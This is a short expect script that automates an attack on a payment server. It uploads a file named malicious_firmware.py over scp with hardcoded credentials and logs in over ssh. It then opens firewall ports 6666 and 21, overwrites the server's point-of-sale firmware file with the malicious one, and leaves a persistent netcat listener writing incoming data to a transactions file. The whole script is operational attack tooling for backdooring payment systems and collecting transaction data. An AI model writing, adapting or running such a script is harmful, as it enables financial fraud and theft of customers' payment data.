#!/usr/bin/expect -f

spawn scp /home/ubuntu/malicious_firmware.py blackhat@payments.fazio.com:/home/blackhat/malicious_firmware.py

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "100%"
wait 1
send "exit\r"

wait 1

spawn ssh blackhat@payments.fazio.com

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "$ "
send "sudo ufw allow 6666\r"

expect "$ "
send "sudo ufw allow 21\r"

expect "$ "
send "sudo mv /home/blackhat/malicious_firmware.py /home/ubuntu/payment-server/pos_firmware.py\r"

expect "$ "
send "sudo nc -k -l 6666 >/home/blackhat/transactions.txt 2>&1 &\r"

expect "$ "
send "exit\r"